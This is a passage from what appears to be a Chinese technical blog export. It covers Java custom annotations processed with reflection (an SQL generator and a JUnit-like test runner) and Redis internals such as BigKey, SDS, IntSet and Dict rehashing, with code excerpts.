  <span class="token annotation punctuation">@Column</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"user_id"</span><span class="token punctuation">)</span>
  <span class="token keyword">private</span> <span class="token class-name">Integer</span> id<span class="token punctuation">;</span>
  
  <span class="token annotation punctuation">@Column</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"user_name"</span><span class="token punctuation">)</span>
  <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
  
  <span class="token annotation punctuation">@Column</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"user_age"</span><span class="token punctuation">)</span>
  <span class="token keyword">private</span> <span class="token class-name">Integer</span> age<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>关系更加清晰，且调整更加灵活。所以我们就可以定义以下这几个注解</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">TYPE</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span><span class="token constant">RUNTIME</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">Table</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">String</span> <span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">FIELD</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span><span class="token constant">RUNTIME</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">Id</span> <span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>

<span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">FIELD</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span><span class="token constant">RUNTIME</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">Column</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">String</span> <span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="注解处理器"><a href="#注解处理器" class="headerlink" title="注解处理器"></a>注解处理器</h2><p>有了注解后，并标识到类或方法中，如果不进行处理，则不会有任何影响，这里我们需要借助到反射机制，在运行时获取到这些信息，并自动生成对应的SQL。也就是编写注解处理器。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> makeSQL <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Person</span><span class="token punctuation">></span></span> aClass <span class="token operator">=</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>
        <span class="token class-name">Table</span> table <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span><span class="token class-name">Table</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">StringBuilder</span> builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>table <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            builder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"creat table "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            builder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>table<span class="token punctuation">.</span><span class="token function">tableName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">" &#123;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token class-name">Field</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fields <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Field</span> field <span class="token operator">:</span> fields<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">Id</span> id <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span><span class="token class-name">Id</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>id <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                builder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"id Bigint, "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">continue</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token class-name">Column</span> column <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span><span class="token class-name">Column</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>column <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                builder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>column<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">" varchar(10) , "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token class-name">String</span> sql <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> builder<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        sql <span class="token operator">=</span> sql <span class="token operator">+</span> <span class="token string">"&#125;;"</span><span class="token punctuation">;</span>
        <span class="token comment">// 最终生成： creat table Person &#123;id Bigint, userName varchar(10) , userAge varchar(10)&#125;;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="MyTest-测试注解编写"><a href="#MyTest-测试注解编写" class="headerlink" title="MyTest 测试注解编写"></a>MyTest 测试注解编写</h2><img src="/Users/qinsicheng/Library/Application%20Support/typora-user-images/image-20230312214048834.png" alt="image-20230312214048834" style="zoom:40%;" />

<p>对于上面的测试方法，相信大家都使用过，那为什么我们给方法上加入 <code>@Test</code> 这个方法就能被执行呢？一个类中不是只有 main方法会被执行吗？这里还是使用了反射的知识点，实际上通过反射获取一个类中拥有 <code>@Test</code> 的方法，然后在运行执行目标方法。下面我们用代码说话：</p>
<ul>
<li>这里我们定义MyTest注解： 这里并没有写注解题，因为我们只打算起一个标识的作用</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">METHOD</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span><span class="token constant">RUNTIME</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">MyTest</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<ul>
<li>创建单元测试类：这里我们test1加入了注解，但test2没有加入</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestJunit</span> <span class="token punctuation">&#123;</span>
    <span class="token annotation punctuation">@MyTest</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"this is test1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"this is test2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>编写注解处理器：</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyTestDemo</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">TestJunit</span><span class="token punctuation">></span></span> aClass <span class="token operator">=</span> <span class="token class-name">TestJunit</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>
      	<span class="token comment">// 通过反射实例化对象</span>
        <span class="token class-name">TestJunit</span> instance <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 获取该类的所有方法</span>
        <span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> methods <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Method</span> method <span class="token operator">:</span> methods<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
           <span class="token comment">// 找到带有 MyTest注解的 方法</span>
            <span class="token class-name">MyTest</span> myTest <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span><span class="token class-name">MyTest</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>myTest <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token comment">// 执行</span>
                method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>instance<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最终打印：<code>this is test1</code></p>
<p>​        其实JUnit也是使用类似的方式进行执行，再配合Idea的插件，所以可以直接点击按钮执行该测试方法。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>注解</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis 底层结构</title>
    <url>//post/Redis/Redis-%E5%BA%95%E5%B1%82%E7%BB%93%E6%9E%84.html</url>
    <content><![CDATA[<h2 id="BigKey"><a href="#BigKey" class="headerlink" title="BigKey"></a>BigKey</h2><h3 id="是什么-？"><a href="#是什么-？" class="headerlink" title="是什么 ？"></a>是什么 ？</h3><p>BigKey通常以Key的大小和Key中成员的数量来综合判定，例如：</p>
<ol>
<li>Key本身的数据量过大：一个String类型的Key，它的值为5 MB。</li>
<li>Key中的成员数过多：一个ZSET类型的Key，它的成员数量为10,000个。</li>
<li>Key中成员的数据量过大：一个Hash类型的Key，它的成员数量虽然只有1,000个但这些成员的Value（值）总大小为100 MB。</li>
</ol>
<p>推荐值：</p>
<ol>
<li>单个key的value小于10KB</li>
<li>对于集合类型的key，建议元素数量小于1000</li>
</ol>
<h3 id="有什么危害-？"><a href="#有什么危害-？" class="headerlink" title="有什么危害 ？"></a>有什么危害 ？</h3><ul>
<li>网络阻塞</li>
</ul>
<p>对BigKey执行读请求时，少量的QPS就可能导致带宽使用率被占满，导致Redis实例，乃至所在物理机变慢 </p>
<ul>
<li>数据倾斜</li>
</ul>
<p>BigKey所在的Redis实例内存使用率远超其他实例，无法使数据分片的内存资源达到均衡 </p>
<ul>
<li>Redis阻塞</li>
</ul>
<p>对元素较多的hash、list、zset等做运算会耗时较旧，使主线程被阻塞 </p>
<ul>
<li>CPU压力</li>
</ul>
<p>对BigKey的数据序列化和反序列化会导致CPU的使用率飙升，影响Redis实例和本机其它应用</p>
<h3 id="怎么识别-？"><a href="#怎么识别-？" class="headerlink" title="怎么识别 ？"></a>怎么识别 ？</h3><ul>
<li>redis-cli –bigkeys</li>
</ul>
<p>利用redis-cli提供的–bigkeys参数，可以遍历分析所有key，并返回Key的整体统计信息与每个数据的Top1的big key </p>
<ul>
<li>scan扫描</li>
</ul>
<p>自己编程，利用scan扫描Redis中的所有key，利用strlen、hlen等命令判断key的长度（此处不建议使用MEMORY USAGE） </p>
<ul>
<li>第三方工具</li>
</ul>
<p>利用第三方工具，如 Redis-Rdb-Tools 分析RDB快照文件，全面分析内存使用情况 </p>
<ul>
<li>网络监控</li>
</ul>
<p>自定义工具，监控进出Redis的网络数据，超出预警值时主动告警</p>
<h3 id="如何删除-？"><a href="#如何删除-？" class="headerlink" title="如何删除 ？"></a>如何删除 ？</h3><p>BigKey内存占用较多，即便时删除这样的key也需要耗费很长时间，导致Redis主线程阻塞，引发一系列问题。 </p>
<ul>
<li>redis 3.0 及以下版本</li>
</ul>
<p>如果是集合类型，则遍历BigKey的元素，先逐个删除子元素，最后删除BigKey </p>
<ul>
<li>Redis 4.0以后 </li>
</ul>
<p>Redis在4.0后提供了异步删除的命令：unlink</p>
<h2 id="底层数据结构"><a href="#底层数据结构" class="headerlink" title="底层数据结构"></a>底层数据结构</h2><h3 id="动态字符串SDS"><a href="#动态字符串SDS" class="headerlink" title="动态字符串SDS"></a>动态字符串SDS</h3><p>Redis并未使用C语言的字符串，因为存在一些问题：</p>
<ol>
<li>获取字符串长度需要运算</li>
<li>非二进制安全</li>
<li>不可修改</li>
</ol>
<p>因此Redis自己优化了字符串结构，为简单动态字符串（Simple Dynamic String），简称SDS。</p>
<p>我们在最初学习Redis时，会操作：<code>set key value</code>, 底层实际上创建了两个SDS，一个包含 key，一个包含 value。</p>
<p><img src="../../typora-user-images/image-20221126101355075.png" alt="image-20221126101355075"></p>
<p>​    我们看到它提到了动态字符串，那相应应该有动态扩容的能力，假如我们要给SDS追加一段字符串“,Amy”，这里首先会申请新内存空间：</p>
<ul>
<li>如果新字符串小于1M，则新空间为扩展后字符串长度的两倍+1；</li>
<li>如果新字符串大于1M，则新空间为扩展后字符串长度+1M+1。称为内存预分配。</li>
</ul>
<blockquote>
<p>优点：</p>
</blockquote>
<ol>
<li>获取字符串长度为 <code>O(1)</code></li>
<li>支持动态扩容</li>
<li>减少内存分配次数</li>
<li>二进制安全</li>
</ol>
<h3 id="IntSet"><a href="#IntSet" class="headerlink" title="IntSet"></a>IntSet</h3><p>IntSet 是Redis的Set结构的一种实现方式，基于<strong>整数数组</strong>来实现，并且<strong>长度可变</strong>，<strong>有序</strong>。</p>
<p><img src="../../typora-user-images/image-20221126101835593.png" alt="image-20221126101835593"></p>
<p>为了方便查找，本身按照整数进行<strong>升序存储</strong>保存到content[]内</p>
<p><img src="../../typora-user-images/image-20221126102206179.png" alt="image-20221126102206179"></p>
<p>假设最初存储元素：<code>&#123;5,10,20&#125;</code>采用的编码是INTSET_ENC_INT16，则每个整数占2字节。</p>
<p>我们向该其中添加一个数字：50000，这个数字超出了int16_t的范围，intset会自动升级编码方式到合适的大小。以当前案例来说流程如下：</p>
<ol>
<li><p>升级编码为INTSET_ENC_INT32, 每个整数占4字节，并按照新的编码方式及元素个数<strong>扩容数组</strong></p>
</li>
<li><p><strong>倒序</strong>依次将数组中的元素拷贝到扩容后的正确位置（倒序保证，之前节点不会被覆盖）</p>
</li>
</ol>
<h4 id="新增流程"><a href="#新增流程" class="headerlink" title="新增流程"></a>新增流程</h4><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">intset *intsetAdd(intset *is, int64_t value, uint8_t *success) &#123;
    uint8_t valenc &#x3D; _intsetValueEncoding(value);&#x2F;&#x2F; 获取当前值编码
    uint32_t pos; &#x2F;&#x2F; 要插入的位置
    if (success) *success &#x3D; 1;
    &#x2F;&#x2F; 判断编码是不是超过了当前intset的编码
    if (valenc &gt; intrev32ifbe(is-&gt;encoding)) &#123;
        &#x2F;&#x2F; 超出编码，需要升级
        return intsetUpgradeAndAdd(is,value);
    &#125; else &#123;
        &#x2F;&#x2F; 在当前intset中查找值与value一样的元素的角标pos
        if (intsetSearch(is,value,&amp;pos)) &#123;
            if (success) *success &#x3D; 0; &#x2F;&#x2F;如果找到了，则无需插入，直接结束并返回失败
            return is;
        &#125;
        &#x2F;&#x2F; 数组扩容
        is &#x3D; intsetResize(is,intrev32ifbe(is-&gt;length)+1);
        &#x2F;&#x2F; 移动数组中pos之后的元素到pos+1，给新元素腾出空间
        if (pos &lt; intrev32ifbe(is-&gt;length)) intsetMoveTail(is,pos,pos+1);
    &#125;
    &#x2F;&#x2F; 插入新元素
    _intsetSet(is,pos,value);
    &#x2F;&#x2F; 重置元素长度
    is-&gt;length &#x3D; intrev32ifbe(intrev32ifbe(is-&gt;length)+1);
    return is;
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="升级流程"><a href="#升级流程" class="headerlink" title="升级流程"></a>升级流程</h4><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">static intset *intsetUpgradeAndAdd(intset *is, int64_t value) &#123;
    &#x2F;&#x2F; 获取当前intset编码
    uint8_t curenc &#x3D; intrev32ifbe(is-&gt;encoding);
    &#x2F;&#x2F; 获取新编码
    uint8_t newenc &#x3D; _intsetValueEncoding(value);
    &#x2F;&#x2F; 获取元素个数
    int length &#x3D; intrev32ifbe(is-&gt;length); 
    &#x2F;&#x2F; 判断新元素是大于0还是小于0 ，小于0插入队首、大于0插入队尾
    int prepend &#x3D; value &lt; 0 ? 1 : 0;
    &#x2F;&#x2F; 重置编码为新编码
    is-&gt;encoding &#x3D; intrev32ifbe(newenc);
    &#x2F;&#x2F; 重置数组大小
    is &#x3D; intsetResize(is,intrev32ifbe(is-&gt;length)+1);
    &#x2F;&#x2F; 倒序遍历，逐个搬运元素到新的位置，_intsetGetEncoded按照旧编码方式查找旧元素
    while(length--) &#x2F;&#x2F; _intsetSet按照新编码方式插入新元素
        _intsetSet(is,length+prepend,_intsetGetEncoded(is,length,curenc));
    &#x2F;* 插入新元素，prepend决定是队首还是队尾*&#x2F;
    if (prepend)
        _intsetSet(is,0,value);
    else
        _intsetSet(is,intrev32ifbe(is-&gt;length),value);
    &#x2F;&#x2F; 修改数组长度
    is-&gt;length &#x3D; intrev32ifbe(intrev32ifbe(is-&gt;length)+1);
    return is;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>总结：</p>
</blockquote>
<ol>
<li>底层为<strong>整数数组</strong>，也就是一块儿完整的内存</li>
<li>内部元素，<strong>唯一</strong>，<strong>有序</strong>。</li>
<li>具备类型升级（<strong>倒序扩容</strong>）。</li>
<li>底层采用二分查找。（因为有序）</li>
</ol>
<h3 id="Dict"><a href="#Dict" class="headerlink" title="Dict"></a>Dict</h3><p>​    我们知道Redis中是Key-Value结构，在Java中类似的也有Map结构，能够快速的进行增删改查，底层一定是有关系的映射。Redis正是基于Dict实现的。</p>
<p>​    Dict有三个部分：哈希表（DictHashTable）、哈希节点（DictEntry）、字典（Dict）</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">typedef struct dictht &#123;
    &#x2F;&#x2F; entry数组
    &#x2F;&#x2F; 数组中保存的是指向entry的指针
    dictEntry **table; 
    &#x2F;&#x2F; 哈希表大小
    unsigned long size;     
    &#x2F;&#x2F; 哈希表大小的掩码，总等于size - 1
    unsigned long sizemask;     
    &#x2F;&#x2F; entry个数
    unsigned long used; 
&#125; dictht;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">typedef struct dictEntry &#123;
    void *key; &#x2F;&#x2F; 键
    union &#123;
        void *val;
        uint64_t u64;
        int64_t s64;
        double d;
    &#125; v; &#x2F;&#x2F; 值
    &#x2F;&#x2F; 下一个Entry的指针
    struct dictEntry *next; 
&#125; dictEntry;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">dict</span> <span class="token punctuation">&#123;</span>
    dictType <span class="token operator">*</span>type<span class="token punctuation">;</span> <span class="token comment">// dict类型，内置不同的hash函数</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>privdata<span class="token punctuation">;</span>     <span class="token comment">// 私有数据，在做特殊hash运算时用</span>
    dictht ht<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 一个Dict包含两个哈希表，其中一个是当前数据，另一个一般是空，rehash时使用</span>
    <span class="token keyword">long</span> rehashidx<span class="token punctuation">;</span>   <span class="token comment">// rehash的进度，-1表示未进行</span>
    <span class="token class-name">int16_t</span> pauserehash<span class="token punctuation">;</span> <span class="token comment">// rehash是否暂停，1则暂停，0则继续</span>
<span class="token punctuation">&#125;</span> dict<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="../../typora-user-images/image-20221126103253031.png" alt="image-20221126103253031"></p>
<p>​    我们可以看到Dict中有两个dictht，第一个负责存储值，第二个负责reHash。也就是当节点个数过多时，需要进行扩容，在Java的Map中，当数组中一个链表的长度大于8，就会进行数组扩容，否则查找遍历太慢。这里的原理是类似的。</p>
<p>​    dictht内部是dictEntry数组，dictEntry含有指向下一个节点的指针。</p>
<h4 id="Dict扩容"><a href="#Dict扩容" class="headerlink" title="Dict扩容"></a>Dict扩容</h4><p>​    这里还是有Java中Map举例，HashMap默认还有加载因子为0.75，也就是说不等我们把空间使用完，底层就会判断如果<code>当前节点数/容量数</code>大于0.75，会频繁导致Hash碰撞，并且链表长度太长，所以需要扩容。</p>
<p>​    Dict在每次新增键值对时都会检查负载因子（LoadFactor = used/size） ，满足以下两种情况时会触发哈希表扩容：</p>
<ul>
<li>哈希表的 LoadFactor &gt;= 1，并且服务器没有执行 BGSAVE 或者 BGREWRITEAOF 等后台进程；</li>
<li>哈希表的 LoadFactor &gt; 5 ；</li>
</ul>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">static int _dictExpandIfNeeded(dict *d)&#123;
    &#x2F;&#x2F; 如果正在rehash，则返回ok
    if (dictIsRehashing(d)) return DICT_OK;    &#x2F;&#x2F; 如果哈希表为空，则初始化哈希表为默认大小：4
    if (d-&gt;ht[0].size &#x3D;&#x3D; 0) return dictExpand(d, DICT_HT_INITIAL_SIZE);
    &#x2F;&#x2F; 当负载因子（used&#x2F;size）达到1以上，并且当前没有进行bgrewrite等子进程操作
    &#x2F;&#x2F; 或者负载因子超过5，则进行 dictExpand ，也就是扩容
    if (d-&gt;ht[0].used &gt;&#x3D; d-&gt;ht[0].size &amp;&amp;
        (dict_can_resize || d-&gt;ht[0].used&#x2F;d-&gt;ht[0].size &gt; dict_force_resize_ratio)&#123;
        &#x2F;&#x2F; 扩容大小为used + 1，底层会对扩容大小做判断，实际上找的是第一个大于等于 used+1 的 2^n
        return dictExpand(d, d-&gt;ht[0].used + 1);
    &#125;
    return DICT_OK;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Dict收缩"><a href="#Dict收缩" class="headerlink" title="Dict收缩"></a>Dict收缩</h4><p>Dict除了扩容以外，每次删除元素时，也会对负载因子做检查，当LoadFactor &lt; 0.1 时，会做哈希表收缩：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// t_hash.c # hashTypeDeleted() </span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">dictDelete</span><span class="token punctuation">(</span><span class="token punctuation">(</span>dict<span class="token operator">*</span><span class="token punctuation">)</span>o<span class="token operator">-></span>ptr<span class="token punctuation">,</span> field<span class="token punctuation">)</span> <span class="token operator">==</span> C_OK<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    deleted <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token comment">// 删除成功后，检查是否需要重置Dict大小，如果需要则调用dictResize重置    /* Always check if the dictionary needs a resize after a delete. */</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">htNeedsResize</span><span class="token punctuation">(</span>o<span class="token operator">-></span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">dictResize</span><span class="token punctuation">(</span>o<span class="token operator">-></span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token comment">// server.c 文件</span>
<span class="token keyword">int</span> <span class="token function">htNeedsResize</span><span class="token punctuation">(</span>dict <span class="token operator">*</span>dict<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">long</span> <span class="token keyword">long</span> size<span class="token punctuation">,</span> used<span class="token punctuation">;</span>
    <span class="token comment">// 哈希表大小</span>
    size <span class="token operator">=</span> <span class="token function">dictSlots</span><span class="token punctuation">(</span>dict<span class="token punctuation">)</span><span class="token punctuation">;</span>
